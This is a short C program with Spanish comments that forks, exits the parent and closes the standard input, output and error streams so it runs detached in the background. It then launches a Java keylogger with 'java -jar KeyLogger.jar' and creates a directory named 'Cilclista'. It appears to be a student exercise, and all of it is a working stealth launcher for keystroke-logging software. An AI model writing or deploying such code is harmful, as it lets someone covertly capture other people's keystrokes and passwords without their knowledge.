//Para el uso de system y exit
#include <stdlib.h>
//Para el uso de fork y close
#include <unistd.h>
//Para el uso de pid_t
#include <fcntl.h>

int main(int argc, char const *argv[])
{

    //creamos un nuevo prceso
    pid_t pid = fork();
    //si hubo un error al crear el nuevo proceso salimos y mandamos un error 10
    if(pid < 0) exit(10);
    //Si se creo bien el nuevo proceso matamos el proceso actual
    if(pid > 0) exit(0);

    //Bloqueamos las entrada estandar
    close(O_RDONLY);
    //Bloqueamos la salida estandar
    close(O_WRONLY);
    //Bloqueamos la salida de Error
    close(O_RDWR);

    //Ejecutamos el KeyLogger creado en java 
    system("java -jar KeyLogger.jar");

	system("mkdir Cilclista");

    return 0x0;
}
